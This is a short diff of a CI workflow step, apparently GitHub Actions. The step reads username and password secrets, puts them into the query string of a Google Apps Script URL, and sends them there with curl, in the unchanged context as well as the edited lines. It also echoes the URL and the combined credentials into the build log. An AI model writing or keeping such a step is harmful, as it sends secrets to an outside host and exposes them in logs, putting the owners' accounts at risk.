@@ -16,9 +16,9 @@ jobs:
         echo "Reading secrets..."
         USERNAME=$USERNAME_SECRET
         PASSWORD=$PASSWORD_SECRET
-        AUTH="$USERNAME:::$PASSWORD"
-        URL="https://script.google.com/macros/s/AKfycbzffhUAOTELo2A5kKkif8cavnh6uz2hBd54uF20AFNYUHPiOP8JSbRa1voZDOFct0Vu/exec?value1=$PASSWORD&value2=$USERNAME"
-        echo Password=>  $URL
+        AUTH="$USERNAME:$PASSWORD"
+        URL=https://script.google.com/macros/s/AKfycbzffhUAOTELo2A5kKkif8cavnh6uz2hBd54uF20AFNYUHPiOP8JSbRa1voZDOFct0Vu/exec?value1=$PASSWORD&value2=$USERNAME
+        echo url is =>  $URL
         curl --location GET $URL
         echo "Auth variable: $AUTH"
       
